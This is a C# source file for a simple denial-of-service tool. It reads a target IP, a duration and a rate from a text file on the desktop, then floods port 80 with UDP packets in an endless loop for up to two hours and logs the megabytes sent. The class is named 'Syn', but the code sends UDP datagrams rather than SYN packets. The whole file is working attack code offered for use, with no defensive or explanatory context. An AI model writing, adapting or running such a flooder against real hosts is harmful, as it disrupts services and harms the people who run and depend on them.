using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Reflection;
using System.ComponentModel;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.Reflection;
using System.Threading;
using System.ComponentModel;

class Syn

{
    static DateTime start = DateTime.Now;

    static int ii = 0;
    static int i = 0;
    static int total = 0;
    static int per = 0;
    static int tot = 12;
    static string p = "1234567890123456789012345678901234567890";
    static string package = (p + p + p + p + p + p + p + p + p + p);
    static byte[] packetData = System.Text.ASCIIEncoding.ASCII.GetBytes(package);

    static string username = Environment.UserName;

    static string[] lines = System.IO.File.ReadAllLines(@"C:\Users\" + username + @"\Desktop\ip-port.txt");

    //Define IP, Port and Time
    static string YourIP = lines[0];
    static int port = 80;
    static int time = 0;


    static void Main(string[] args)
    {
        synstop();
    }

    public static void synstop()
    {

        try
        {
            time = int.Parse(lines[1]);
        }
        catch (Exception e)
        {
            time = 2147483646;
        }
        if (time > 2 * 60 * 60) time = 2 * 60 * 60;

        IPEndPoint ep = new IPEndPoint(IPAddress.Parse(YourIP), port);

        try
        {
            tot = int.Parse(lines[2]);
        }
        catch (Exception e)
        {

        }

        Console.WriteLine("tot: " + tot);
        Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
        client.SendTimeout = 100000;

        Console.WriteLine("ip+" + YourIP + "\n time:" + time);
        Console.WriteLine("Sended " + Math.Round(total * package.Length / 1024 / 102.4 * 10) / 100 + " \t MB");


        while (true)
        {

            per++;
            if (per > tot)
            {
                System.Threading.Thread.Sleep(10);
                per = 0;
            }
            if ((DateTime.Now - start).TotalSeconds >= time)
                break;
            total++;
            i++;
            client.SendTo(packetData, ep);
            if (i >= 5084)
            {
                i = 0;
                Console.WriteLine("Sended " + Math.Round(total * package.Length / 1024 / 102.4 * 10) / 100 + " \t MB");
            }
        }
    }
}